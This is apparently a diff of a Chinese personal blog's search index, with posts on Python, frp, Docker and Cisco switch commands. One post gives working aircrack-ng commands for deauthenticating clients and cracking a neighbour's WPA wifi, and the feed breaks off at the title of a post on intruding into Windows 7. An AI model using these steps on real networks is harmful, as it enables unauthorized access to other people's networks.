+      <link href="/2019/12/16/%E6%8E%B7%E9%AA%B0%E5%AD%90%E5%86%B3%E5%AE%9A%E5%81%9A%E4%BB%80%E4%B9%88%E4%BA%8B%E6%83%85/"/>
+      <url>/2019/12/16/%E6%8E%B7%E9%AA%B0%E5%AD%90%E5%86%B3%E5%AE%9A%E5%81%9A%E4%BB%80%E4%B9%88%E4%BA%8B%E6%83%85/</url>
+      
+        <content type="html"><![CDATA[<h1 id="掷骰（tou）子决定做什么事情"><a href="#掷骰（tou）子决定做什么事情" class="headerlink" title="掷骰（tou）子决定做什么事情"></a>掷骰（tou）子决定做什么事情</h1><p>最近在学python的时候看见一段有趣的代码，就是掷骰子决定做什么事情，顿时感觉这是个好东西，平时自己有时候学习久了就会发懵，一时间不知道自己该做什么了，有太多的东西想学了，反而会无从下手。有了这个游戏，我就可以掷骰子决定自己做什么事情。另外在生活上也能派上用场，比如和朋友玩时没决定好做什么的时候，就可以拿出来玩一下了。</p><a id="more"></a><pre><code>&quot;&quot;&quot;掷骰子决定做什么事情&quot;&quot;&quot;from random import randint# get random number 1-6face = randint(1, 6)print(face)if face == 1:    res = &#39;linux&#39;elif face == 2:    res = &#39;kali&#39;elif face == 3:    res = &#39;python&#39;elif face == 4:    res = &#39;take a walk&#39;elif face == 5:    res = &#39;exercise&#39;else:    res = &#39;play games&#39;print(&#39;play&#39; + res)</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> python </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>pip install scrapy 命令安装scrapy显示错误</title>
+      <link href="/2019/12/14/pip%20install%20scrapy%20%E5%91%BD%E4%BB%A4%E5%AE%89%E8%A3%85scrapy%E6%98%BE%E7%A4%BA%E9%94%99%E8%AF%AF/"/>
+      <url>/2019/12/14/pip%20install%20scrapy%20%E5%91%BD%E4%BB%A4%E5%AE%89%E8%A3%85scrapy%E6%98%BE%E7%A4%BA%E9%94%99%E8%AF%AF/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Python安装scrapy失败解决方法"><a href="#Python安装scrapy失败解决方法" class="headerlink" title="Python安装scrapy失败解决方法"></a>Python安装scrapy失败解决方法</h1><h2 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h2><p>Scrapy是Python开发的一个快速、高层次的屏幕抓取和web抓取框架，用于抓取web站点并从页面中提取结构化的数据。Scrapy用途广泛，可以用于数据挖掘、监测和自动化测试。</p><a id="more"></a><p>安装 Scrapy 与安装其他 Python 包没有区别，同样使用如下命令来安装：<br>pip install scrapy<br>如果在命令行窗口中运行该命令，将会看到程序并不立即下载、安装 Scrapy，而是不断地下载大量第三方包。<br>如果在命令行窗口中提示找不到 pip 命令，则也可以通过 python 命令运行 pip 模块来安装 Scrapy，例如 python -m pip install scrapy</p><p>这是因为 Scrapy 需要依赖、大量第三方包。典型的，Scrapy 需要依赖如下第三方包：</p><p>   pyOpenSSL：Python 用于支持 SSL（Security Socket Layer）的包。<br>   cryptography：Python 用于加密的库。<br>   CFFI：Python 用于调用 C 的接口库。<br>   zope.interface：为 Python 缺少接口而提供扩展的库。<br>   lxml：一个处理 XML、HTML 文档的库，比 Python 内置的 xml 模块更好用。<br>   cssselect：Python 用于处理 CSS 选择器的扩展包。<br>   Twisted：为 Python 提供的基于事件驱动的网络引擎包。<br>    ……</p><p><code>python -m pip install scrapy</code> 命令安装scrapy显示错误<br>或者<code>pip install scrapy</code> 命令安装scrapy显示错误</p><p><a href="http://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted" target="_blank" rel="noopener">http://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted</a><br>去这个网址上下载twisted<br>cp后面是python版本，amd64代表64位<br>例如：Twisted-19.10.0-cp38-cp38-win_amd64.whl</p><p>下载到一个目录上后：<br>例如：D:\Software area</p><p>接下来要用管理员身份模式打开终端cmd或者powershell</p><p>powershell切换到D盘<br>cd d:<br>安装Twisted<br>PS D:\Software area&gt; python -m pip install .\Twisted-19.10.0-cp38-cp38-win_amd64.whl</p><p>cmd<br>切换到D盘<br>C:\Users\caiii&gt;d:<br>D:&gt;dir<br>安装Twisted<br>D:\Software area&gt;python -m pip install .\Twisted-19.10.0-cp38-cp38-win_amd64.whl </p><p>安装完Twisted后</p><p>再次安装<br>python -m pip install scrapy 或者 pip install scrapy<br>就会显示成功安装了</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> python </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>用python画一朵玫瑰花</title>
+      <link href="/2019/12/12/%E4%BD%BF%E7%94%A8python%E7%94%BB%E7%8E%AB%E7%91%B0%E8%8A%B1/"/>
+      <url>/2019/12/12/%E4%BD%BF%E7%94%A8python%E7%94%BB%E7%8E%AB%E7%91%B0%E8%8A%B1/</url>
+      
+        <content type="html"><![CDATA[<p>这是我按照网上的教程写出来的，做了细节上的修改。这是我经手的第一朵花，放上我的博客做个纪念。</p><a id="more"></a><pre><code>## 代码如下：import turtleturtle.speed(15)turtle.screensize(400, 300, &quot;pink&quot;)turtle.goto(-200, 0)turtle.setup(1000, 600)turtle.write(&#39;赠：亲爱的           &#39;, move=True, align=&#39;left&#39;, font=(&#39;楷体&#39;, 16, &#39;normal&#39;))# 设置初始位置turtle.pensize(2)turtle.penup()turtle.left(90)turtle.forward(200)turtle.pendown()turtle.right(90)# 花蕊turtle.fillcolor(&quot;red&quot;)turtle.begin_fill()turtle.circle(10, 180)turtle.circle(25, 110)turtle.left(50)turtle.circle(60, 45)turtle.circle(20, 170)turtle.right(24)turtle.fd(30)turtle.left(10)turtle.circle(30, 110)turtle.fd(20)turtle.left(40)turtle.circle(90, 70)turtle.circle(30, 150)turtle.right(30)turtle.fd(15)turtle.circle(80, 90)turtle.left(15)turtle.fd(45)turtle.right(165)turtle.fd(20)turtle.left(155)turtle.circle(150, 80)turtle.left(50)turtle.circle(150, 90)turtle.end_fill()# 花瓣1turtle.left(150)turtle.circle(-90, 70)turtle.left(20)turtle.circle(75, 105)turtle.setheading(60)turtle.circle(80, 98)turtle.circle(-90, 40)# 花瓣2turtle.left(180)turtle.circle(90, 40)turtle.circle(-80, 98)turtle.setheading(-83)# 叶子1turtle.pensize(10)turtle.fd(30)turtle.pensize(2)turtle.left(90)turtle.fd(25)turtle.left(45)turtle.fillcolor(&quot;green&quot;)turtle.begin_fill()turtle.circle(-80, 90)turtle.right(90)turtle.circle(-80, 90)turtle.end_fill()turtle.right(135)turtle.fd(100)turtle.fd(-50)turtle.left(35)turtle.fd(30)turtle.fd(-30)turtle.right(35)turtle.fd(-10)turtle.right(35)turtle.fd(30)turtle.fd(-30)turtle.right(145)turtle.fd(65)turtle.pensize(10)turtle.left(90)turtle.fd(80)# 叶子2turtle.pensize(2)turtle.right(90)turtle.right(45)turtle.fillcolor(&quot;green&quot;)turtle.begin_fill()turtle.circle(80, 90)turtle.left(90)turtle.circle(80, 90)turtle.end_fill()turtle.left(135)turtle.fd(100)turtle.fd(-40)turtle.right(35)turtle.fd(30)turtle.fd(-30)turtle.left(35)turtle.fd(-20)turtle.left(35)turtle.fd(30)turtle.fd(-30)turtle.left(145)turtle.fd(40)turtle.right(90)turtle.pensize(10)turtle.circle(300, 60)turtle.hideturtle()turtle.done()exit()</code></pre><h2 id="附上我的效果图"><a href="#附上我的效果图" class="headerlink" title="附上我的效果图"></a>附上我的效果图</h2><p><img src="https://img-blog.csdnimg.cn/20191213002843928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> python </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Linux系统设置frp开机自动启动</title>
+      <link href="/2019/12/12/Linux%E7%B3%BB%E7%BB%9F%E8%AE%BE%E7%BD%AEfrp%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/"/>
+      <url>/2019/12/12/Linux%E7%B3%BB%E7%BB%9F%E8%AE%BE%E7%BD%AEfrp%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/</url>
+      
+        <content type="html"><![CDATA[<p>之前写过一篇关于搭建frp服务的文章，里面采用的后台启动方式有一个很大的弊端，就是系统重启之后，frp的服务就要手动开启一次才能正常运行，这实在是不能忍的，现在都什么年代了，现在都流行自动化了，所以必须要让frp开机启动。本文只讲ubuntu系统和centos系统，这两个系统使用率较高，windows系统的还没实践过就先不讲。</p><a id="more"></a><h2 id="ubuntu系统下："><a href="#ubuntu系统下：" class="headerlink" title="ubuntu系统下："></a>ubuntu系统下：</h2><p>第一步：下载安装Ubuntu下常用的进程管理器supervisor：</p><pre><code>sudo apt install supervisor -y</code></pre><p>第二步：在/etc/supervisor/conf.d下新建一个配置文件frp.conf。输入以下内容。command 是放置frp的位置。</p><pre><code>vim /etc/supervisor/conf.d/frp.conf</code></pre><p>客户端：</p><pre><code>[program:frp]command = /etc/frp/frpc -c /etc/frp/frpc.iniautostart = true</code></pre><p>服务端：</p><pre><code>[program:frp]command = /etc/frp/frps -c /etc/frp/frps.iniautostart = true</code></pre><p>重启supervisor</p><pre><code>sudo systemctl restart supervisor</code></pre><p>查看运行状态：</p><pre><code>sudo systemctl status supervisor</code></pre><p>查看frp服务是否已经启动</p><pre><code>ps -ef | grep frp</code></pre><p>最后设置supervisor开机启动</p><pre><code>sudo systemctl enable supervisor</code></pre><h2 id="centos7系统下"><a href="#centos7系统下" class="headerlink" title="centos7系统下"></a>centos7系统下</h2><p>例如：frp的文件路径是/etc/frp/下</p><p>客户端：<br>第一步：<br><code>cp /etc/frp/frpc /usr/local/bin/frpc</code><br>第二步：<br><code>vim /lib/systemd/system/frpc.service</code><br>填入一下内容：</p><pre><code>[Unit]Description=frpc serviceAfter=network.target syslog.targetWants=network.target[Service]Type=simpleExecStart=/etc/frp/frpc -c /etc/frp/frpc.ini[Install]WantedBy=multi-user.target</code></pre><p>保存退出</p><pre><code>systemctl daemon-reloadsystemctl start frpc        #启动frpcsystemctl status frpc     #查看状态systemctl enable frpc     #设置开机启动</code></pre><p>服务端：<br>第一步：<br><code>cp /etc/frp/frps /usr/local/bin/frps</code><br>第二步：<br><code>vim /lib/systemd/system/frps.service</code><br>填入一下内容：</p><pre><code>[Unit]Description=frps serviceAfter=network.target syslog.targetWants=network.target[Service]Type=simpleExecStart=/etc/frp/frps -c / etc/frp/frps.ini[Install]WantedBy=multi-user.target</code></pre><p>保存退出</p><pre><code>systemctl start frps        #启动frpssystemctl status frps     #查看状态systemctl enable frps    #设置开机启动</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 教程 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>centos7安装docker</title>
+      <link href="/2019/12/08/centos7%E5%AE%89%E8%A3%85docker/"/>
+      <url>/2019/12/08/centos7%E5%AE%89%E8%A3%85docker/</url>
+      
+        <content type="html"><![CDATA[<h2 id="检查是否安装过-docker-："><a href="#检查是否安装过-docker-：" class="headerlink" title="检查是否安装过 docker ："></a>检查是否安装过 docker ：</h2><pre><code class="vim">yum list installed | grep docker</code></pre><p>如果有安装了，如果重新安装需要先卸载：<br>使用命令 <code>yum -y remove docker-ce.x86_64</code>  卸载</p><p>删除存储目录：</p><pre><code class="vala"># rm -rf /etc/docker# rm -rf /run/docker# rm -rf /var/lib/dockershim# rm -rf /var/lib/docker</code></pre><a id="more"></a><h2 id="开始安装："><a href="#开始安装：" class="headerlink" title="开始安装："></a>开始安装：</h2><p>使用命令 uname-r 检查centOs的内核版本 docker要求centOs的内核版本在3.10 以上</p><p>安装必要的系统工具：</p><pre><code class="haskell">sudo yum install -y yum-utils device-mapper-persistent-data lvm2</code></pre><p>添加软件源信息 ：</p><pre><code class="vim">sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</code></pre><p> 更新yum 缓存：</p><pre><code class="ebnf"> sudo yum makecache fast </code></pre><p>安装docker-ce ：</p><pre><code class="ebnf">sudo yum -y install docker-ce</code></pre><p>启动 docker 后台服务 ：</p><pre><code class="ebnf">sudo systemctl start docker</code></pre><p>设置开机启动docker服务：</p><pre><code class="bash">sudo systemctl enable docker</code></pre><p>运行hello-world 镜像：</p><pre><code class="dockerfile">docker run hello-world</code></pre><p>看到Hello from Docker! 字样说明已经安装成功。</p><p>一些常用的指令：<br><code>docker version</code>    查看版本<br><code>docker info</code>      查看基本信息</p><h2 id="接下来安装镜像"><a href="#接下来安装镜像" class="headerlink" title="接下来安装镜像"></a>接下来安装镜像</h2><p>查看一下镜像列表</p><pre><code class="stata">docker search centos</code></pre><p>下载centos镜像</p><pre><code class="ebnf">docker pull centos</code></pre><p>查看镜像列表</p><pre><code class="ebnf">docker images</code></pre><p>运行centos镜像</p><pre><code class="groovy">docker run -it centos:latest /bin/bash</code></pre><p>参数解释：<br>run ： 运行<br>-i   ：以交互模式运行容器，通常与 -t 同时使用<br>-t  ： 为容器重新分配一个伪输入终端，通常与 -i 同时使用<br>latest  ： 镜像版本<br>/bin/bash  ： 镜像的终端</p><p><strong>告警：IPv4 forwarding is disabled. Networking will not work.<br>解决：开启网络转发功能<br>方法1：<br>cat /proc/sys/net/ipv4/ip_forward  查看是否为1<br>echo 1 &gt; /proc/sys/net/ipv4/ip_forward<br>方法2：<br>vim /etc/sysctl.conf<br>添加<br>net.ipv4.ip_forward = 1<br>保存退出后查看：<br>sysctl -p<br>cat /proc/sys/net/ipv4/ip_forward</strong></p><pre><code class="elixir">[root@localhost ~]# docker run -it centos:latest /bin/bash[root@df8906f5a898 /]#</code></pre><p>说明已成功运行了。</p><p>查看下系统版本：</p><pre><code class="lsl">[root@42f11d0175a3 /]# cat /etc/redhat-release CentOS Linux release 8.0.1905 (Core)</code></pre><p>退出系统用exit</p><p>示例：在container中启动一个长久运行的进程，不断向stdin输出hello world。模拟一个后台运行的服务。</p><pre><code class="dockerfile">docker run -d centos:latest /bin/bash -c &quot;while true; do echo hello world; sleep 1; done&quot;</code></pre><p>参数：<br>-d  后台运行容器，并返回容器ID；<br>-c  后面跟待完成的命令。</p><p>从容器中查看日志，查看输出的内容<br>语法： docker logs 容器name/ID</p><pre><code class="dns">docker logs 69bec6b3d840</code></pre><p>查看容器ID<br><code>docker ps</code>    列出所有运行中的容器<br><code>docker ps -a</code>   查看所有容器</p><p>结束运行的容器进程</p><pre><code class="sql">docker psdocker kill IDdocker kill 69bec6b3d840</code></pre><p>启动、停止、重启 容器进程：</p><pre><code class="sql">docker start IDdocker stop IDdocker restart ID</code></pre><p>删除容器：（容器关闭的前提下）</p><pre><code class="stata">docker rm ID</code></pre><p>强制删除：</p><pre><code class="bash">docker rm -f ID</code></pre><h2 id="docker镜像制作方法"><a href="#docker镜像制作方法" class="headerlink" title="docker镜像制作方法"></a>docker镜像制作方法</h2><p>两种方法：<br>方法1：docker commit   # 保存container的当前状态到image后，然后生成对应的image。<br>方法2：docker build   # 使用dockerfile文件自动化制作image。</p><p>方法1示例：制作一个apache的镜像</p><pre><code class="awk">docker run -it centos:latest /bin/bashyum install -y httpdexitdocker ps -a[root@localhost ~]# docker commit 2c9ae8cf8ba6 centos:apache   命名为centos：apache</code></pre><p>查看下是否保存成功：</p><pre><code class="lsl">[root@localhost ~]# docker imagesREPOSITORY          TAG                 IMAGE ID            CREATED             SIZEcentos              apache              9017e4f2adb4        15 seconds ago      269MBcentos              latest              0f3e07c0138f        2 months ago        220MBhello-world         latest              fce289e99eb9        11 months ago       1.84kB</code></pre><p>删除镜像：<br><code>docker rmi centos:latest</code><br>或者 <code>docker rmi 0f3e07c0138f</code></p><h2 id="docker-image-的发布"><a href="#docker-image-的发布" class="headerlink" title="docker image 的发布"></a>docker image 的发布</h2><p>方法1：save image to tarball<br>保存image到tar包<br>语法：docker save -o 导出的镜像名.tar  本地镜像名：镜像标签</p><pre><code class="css">[root@localhost ~]# docker save -o docker-centos-latest.tar centos:latest</code></pre><p>方法2： push image to docker hub<br>1.signup on docker hub &amp; create repo    注册一个账号<br><a href="https://hub.docker.com/" target="_blank" rel="noopener">https://hub.docker.com/</a><br>2.login to docker hub</p><pre><code class="shell"># docker login -u 用户名 -p 密码 -e 123456789@qq.com</code></pre><p>3.push image to docker hub   # 上传镜像</p><pre><code class="css">#docker push centos:latest</code></pre><p>4.pull image from docker hub   # 下载镜像</p><pre><code class="vala">#docker pull 用户名/镜像名：镜像标签</code></pre><h2 id="导入本地镜像"><a href="#导入本地镜像" class="headerlink" title="导入本地镜像"></a>导入本地镜像</h2><pre><code class="stylus">docker load -i docker-centos-latest.tar</code></pre><h2 id="container-容器端口映射"><a href="#container-容器端口映射" class="headerlink" title="container 容器端口映射"></a>container 容器端口映射</h2><pre><code>[root@localhost ~]# netstat -tunlpdocker run -it -d --name my-httpd -p 8088:80 centos:apache[root@localhost ~]# netstat -tunlp</code></pre><p>访问已经运行的容器：</p><pre><code>docker psdocker  exec -it 0f3e07c0138f /bin/bash</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 教程 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>思科交换机常用指令（持续更新）</title>
+      <link href="/2019/11/18/%E6%80%9D%E7%A7%91%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"/>
+      <url>/2019/11/18/%E6%80%9D%E7%A7%91%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
+      
+        <content type="html"><![CDATA[<h1 id="思科交换机常用指令"><a href="#思科交换机常用指令" class="headerlink" title="思科交换机常用指令"></a>思科交换机常用指令</h1><h2 id="vlan设置"><a href="#vlan设置" class="headerlink" title="vlan设置"></a>vlan设置</h2><pre><code>console&gt;enable    //进入特权模式console#configure      //进入配置视图console(config)#vlan database     //进入vlan配置console(config-vlan)#vlan 2   //创建vlan2console(config-vlan)#no vlan 2      //删除vlan 2console(config-vlan)#exit    //退回到特权模式下console(config)#interface vlan 2      //进入vlan2的配置视图console(config-if-vlan2)#name xxx    //为vlan2修改名字</code></pre><h2 id="端口配置"><a href="#端口配置" class="headerlink" title="端口配置"></a>端口配置</h2><a id="more"></a><pre><code> console(config)#interface ethernet 1/g1    //进入网口1，/1/g1指的是第一个插槽上的第一个千兆网口console(config-if-1/g1)#     //接口视图模式console(config-if-1/g1)# speed 10/100/1000      //定义端口的带宽，只能从这三种模式中做选择。console(config-if-1/g1)# duplex full/half     //定义双工模式console(config-if-1/g1)# negotiation    //启用自动协商速度和双工参数console(config-if-1/g1)# no negotiation  //禁用自动协商速度和双工参数console(config-if-1/g1)# switchport mode access/trunk/general       //定义端口类型，总共有三种类型console(config-if-1/g1)# switchport access vlan 2     //将端口以access模式加入到vlan 2 中console(config-if-1/g1)# shutdown     //关闭当前端口console(config-if-1/g1)# no shutdown       //打开当前端口console(config)#interface   ethernet 1/g24        //进入汇聚千兆口24，共有四个千兆combo口21-24console(config-if-1/g24)#      //接口视图模式console(config-if-1/g24)#duplex  auto/full/half      //设置端口工作模式为 自适应/全双通/半双通console(config-if-1/g24)#switchport mode trunk      //设置当前端口模式为汇聚口console(config-if-1/g24)#switchport mode access    //设置当前端口模式为接入模式console(config-if-1/g24)#switchport trunk allowed vlan add/remove 1,2     //将当前汇聚端口加入或移除从vlan 1 ，2通过，vlan修剪，默认为all，全部允许console(config-if-1/g24)#switchport access vlan 2    //将当前端口以access模式加入到vlan2 中若21-24号口用作光口的话，配置接口就对应1/xg1-1/xg4代表使用光纤做10G上联口用：console(config)#interface ethernet 1/xg1       //进入汇聚万兆口1，共有4个千兆combo口21-24对应四个1/xg1-1/xg4万兆光口console(config-if-1/xg1)#console(config-if-1/xg1)#duplex auto/full/half      //设置端口工作模式为  自适应/全双通/半双通console(config-if-1/xg1)#switchport mode trunk   //设置当前端口模式为汇聚口console(config-if-1/xg1)#switchport mode access  //设置当前端口模式为接入模式console(config-if-1/xg1)#switchport trunk allowed vlan add/remove  1,2    //将当前汇聚端口加入或移除从vlan1，2通过，vlan修剪，默认为all，全部允许console(config-if-1/xg1)#switchport access vlan 2  //将当前端口以access模式加入vlan2中</code></pre><h2 id="将单个端口加入vlan"><a href="#将单个端口加入vlan" class="headerlink" title="将单个端口加入vlan"></a>将单个端口加入vlan</h2><pre><code>console(config)#interface ethernet 1/g1console(config-if-1/g1)#switchport mode access console(config-if-1/g1)#switchport access vlan 2</code></pre><h2 id="将多个端口加入到vlan中"><a href="#将多个端口加入到vlan中" class="headerlink" title="将多个端口加入到vlan中"></a>将多个端口加入到vlan中</h2><pre><code>console(config)#interface range ethernet 1/g1-1/g12     //进入1-12这个接口组里配置console(config-if)#switchport mode accessconsole(config-if)#switchport access vlan 2console#show vlan    //用于查看配置后结果</code></pre><p>设置VTP<br>cisco专有的vlan终级协议也成为局域网干道协议，作用是十几台交换机在企业网中，配置vlan工作量大，可以使用VTP协议，把一台交换机配置成VTP server，其余交换机配置成VTP client，这样他们可以自动学习到server上的vlan信息</p><h2 id="交换机配置IP地址"><a href="#交换机配置IP地址" class="headerlink" title="交换机配置IP地址"></a>交换机配置IP地址</h2><pre><code>console(config)#interface vlan 1       //进入vlan1console(config-if-vlan1)#ip address 119.167.223.221 255.255.255.128  //设置交换机的管理ip地址console(config)#ip default-gateway 119.167.223.254    //设置交换机的默认网关console(config)#end     //退出当前模式</code></pre><h2 id="交换机保存设置命令"><a href="#交换机保存设置命令" class="headerlink" title="交换机保存设置命令"></a>交换机保存设置命令</h2><pre><code>console#copy running-config startup-config    //将当前正在使用中的配置保存到交换机开机需要加载的配置文件里去。console#copy running-config backup-config      //将当前的配置保存到备份配置文件里</code></pre><h2 id="交换机显示命令"><a href="#交换机显示命令" class="headerlink" title="交换机显示命令"></a>交换机显示命令</h2><p>特权模式下：</p><pre><code>console#show running-config    //显示当前正在使用的配置信息console#show startup-config    //显示交换机开机时自动加载的配置文件console#show vlan    //显示vlan的配置信息console#show interfaces configuration ethernet 1/g1       //显示二层端口状态，可以用来决定此口是否为二层或三层口console#show ip interface vlan 100    //查看交换机vlan100的IP配置信息console#show version    //查看交换机固件版本信息</code></pre><h2 id="基于端口的mac地址绑定"><a href="#基于端口的mac地址绑定" class="headerlink" title="基于端口的mac地址绑定"></a>基于端口的mac地址绑定</h2><pre><code>console#config  //进入配置视图模式console(config)#interface ethernet 1/g1     //进入具体端口视图模式下console(config-if-1/g1)#switch port-secruity     //配置端口安全模式console(config-if-1/g1)#switchport port-seruity mac-address MAC(主机的mac地址）     //配置该端口要绑定的主机mac地址console(config-if-1/g1)# no switchport port-seruity mac-address MAC(主机的mac地址）  //删除绑定主机的mac地址</code></pre><h2 id="配置交换机的snmp功能"><a href="#配置交换机的snmp功能" class="headerlink" title="配置交换机的snmp功能"></a>配置交换机的snmp功能</h2><pre><code>console(config)#snmp-server community xxx ro     //xxx为自定义的共同体名称，并且团体的权限为只读console(config)#snmp-server host x.x.x.x(ip地址）xxx（团体名）    //设置管理机x.x.x.x同时允许该管理机以团体名xxx访问。console(config)#snmp-server enable traps     //启用snmp服务</code></pre><h2 id="交换机禁ping配置"><a href="#交换机禁ping配置" class="headerlink" title="交换机禁ping配置"></a>交换机禁ping配置</h2><pre><code>console(config)#access-list 110 deny icmp any any      //配置访问控制列表（Access Control List，ACL）110指的是ICMP对应ping。console(config)#access-list 110 permit ip any any   //运行所有的ip协议的应用console(config)#int vlan 1console(config-if-vlan1)#ip access-group 110 in console(config)#int vlan 2console(config-if-vlan2)#ip access-group 110 inconsole(config)#int vlan 3console(config-if-vlan3)#ip access-group 110 inconsole(config)#interface ethernet 1/g1     //端口禁pingconsole(config-if-1/g1)#ip access-group 110 in</code></pre><h2 id="恢复交换机出厂设置"><a href="#恢复交换机出厂设置" class="headerlink" title="恢复交换机出厂设置"></a>恢复交换机出厂设置</h2><pre><code>console#clear config    //恢复交换机出厂设置console#reload     //重新启动交换机</code></pre><pre><code>  交换机工作于OSI参考模型的第二层，即数据链路层。交换机内部的cpu会在每个端口成功连接时，通过将mac地址和端口对应，形成一张mac表。在今后的通讯中，发往该mac地址的数据包将仅送往其对应的端口，而不是所有的端口。因此，交换机可用于划分链路层广播，即冲突域，但它不能划分网络层广播，即广播域。 交换机拥有一条很高带宽的背部总线和内部交换矩阵。交换机的所有的端口都挂接在这条背部总线上，控制电路收到数据包以后，处理端口会查找内存中的地址对照表以确定目的mac（网卡的硬件地址）的NIC（网卡）挂接在哪个端口上，通过内部交换矩阵迅速将数据包传送到目的端口，目的mac若不存在，广播到所有的端口，接收端口回应后，交换机会“学习”新的mac地址，并把它添加到内部mac地址表中。使用交换机也可以把网络“分段”，通过对照IP地址表，交换机只允许必要的网络流量通过交换机。通过交换机的过滤和转发，可以有效的减少冲突域，但它不能划分网络层广播，即广播域。</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 教程 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>使用kali破解邻居wifi</title>
+      <link href="/2019/11/18/%E4%BD%BF%E7%94%A8kali%E7%A0%B4%E8%A7%A3%E9%82%BB%E5%B1%85wifi/"/>
+      <url>/2019/11/18/%E4%BD%BF%E7%94%A8kali%E7%A0%B4%E8%A7%A3%E9%82%BB%E5%B1%85wifi/</url>
+      
+        <content type="html"><![CDATA[<p><strong>前提条件</strong></p><p>1.kali系统<br>2.适用kali的无线网卡<br>3.kali默认的字典路径：/usr/share/wordlists/rockyou.txt.gz</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><a id="more"></a><h4 id="第一步：接入无线网卡"><a href="#第一步：接入无线网卡" class="headerlink" title="第一步：接入无线网卡"></a>第一步：接入无线网卡</h4><p>使用<code>ifconfig</code>指令查看是否有wlan0这个网卡，有则证明接入成功。</p><h4 id="第二步：启动监听网卡"><a href="#第二步：启动监听网卡" class="headerlink" title="第二步：启动监听网卡"></a>第二步：启动监听网卡</h4><pre><code>airmon-ng start wlan0</code></pre><p>开启之后再次输入ifconfig查看是否有wlan0mon，有则证明网卡开启监听模式了。</p><h4 id="第三步：扫描wifi"><a href="#第三步：扫描wifi" class="headerlink" title="第三步：扫描wifi"></a>第三步：扫描wifi</h4><pre><code>airodump-ng wlan0mon</code></pre><p>扫描到目标wifi后，记录下目标的BSSID 和CH<br>按ctrl+c结束扫描</p><h4 id="第四步：抓取目标的握手包"><a href="#第四步：抓取目标的握手包" class="headerlink" title="第四步：抓取目标的握手包"></a>第四步：抓取目标的握手包</h4><pre><code>airodump-ng -c 7 --bssid 78:44:FD:59:00:88 -w xiaoming wlan0mon</code></pre><p>参数解释：<br>-c指定频道号<br>–bssid指定路由器bssid<br>-w指定抓取的数据包保存位置</p><h4 id="第五步："><a href="#第五步：" class="headerlink" title="第五步："></a>第五步：</h4><p>强制连接到wifi的设备重新连接路由器</p><pre><code>aireplay-ng -0 2 -a 78:44:FD:59:00:88 -c B8:E8:56:09:CC:9C wlan0mon</code></pre><p>参数解释：<br>-0表示发起deauthentication攻击<br>-a指定无线路由器BSSID<br>-c指定强制断开的设备</p><p>如果成功的话，会在右上角看到 WPA handshake: 00:00:00:00:00:00 类似这样的提示。</p><h4 id="第六步：开始破解密码"><a href="#第六步：开始破解密码" class="headerlink" title="第六步：开始破解密码"></a>第六步：开始破解密码</h4><pre><code>aircrack-ng -a2 -b 78:44:FD:59:00:88 -w /usr/share/wordlists/rockyou.txt ~/*.cap</code></pre><p>能否破解就看字典够不够强。没有破不开的wifi密码，只有不够强的字典。<br>建议大家设置wifi密码时要尽可能的复杂。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 教程 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>kali入侵win7</title>
+      <link href="/2019/11/18/kali%E5%85%A5%E4%BE%B5win7/"/>
+      <url>/2019/11/18/kali%E5%85%A5%E4%BE%B5win7/</url>
+      
